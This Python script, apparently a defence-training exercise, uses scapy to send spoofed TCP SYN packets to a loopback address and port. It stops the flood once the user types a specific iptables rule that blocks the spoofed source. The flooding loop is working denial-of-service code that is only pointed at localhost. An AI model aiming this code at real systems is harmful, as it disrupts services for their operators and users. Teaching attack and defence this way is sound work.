from scapy.all import IP, TCP, send
import threading
import time
import sys

attack_active = True

def launch_dos_attack(target_ip, target_port):
    global attack_active
    print(f"Launching DoS attack on {target_ip}:{target_port}...")
    while attack_active:
        try:
            packet = IP(src="127.0.0.3", dst=target_ip) / TCP(dport=target_port, flags="S")
            send(packet, verbose=0)
            time.sleep(0.1)
        except PermissionError:
            print("Error: Permission denied. Please run the script with sudo.")
            sys.exit(1)
        except KeyboardInterrupt:
            print("DoS attack stopped.")
            break

def wait_for_user_defense():
    global attack_active
    print("DoS attack started. Defend the attack by blocking the attacker's IP")
    print("command: sudo iptables -A INPUT -s 127.0.0.3 -j DROP")
    
    while True:
        user_input = input("Enter your command: ").strip()
        if user_input == "sudo iptables -A INPUT -s 127.0.0.3 -j DROP":
            print("DoS attack has been stopped.")
            attack_active = False
            return True
        else:
            print("Incorrect command. Try again.")

def main():
    target_ip = "127.0.0.2"
    target_port = 4000

    dos_thread = threading.Thread(target=launch_dos_attack, args=(target_ip, target_port))
    dos_thread.start()

    if wait_for_user_defense():
        dos_thread.join()
        print("DoS attack successfully defended.")

if __name__ == "__main__":
    main()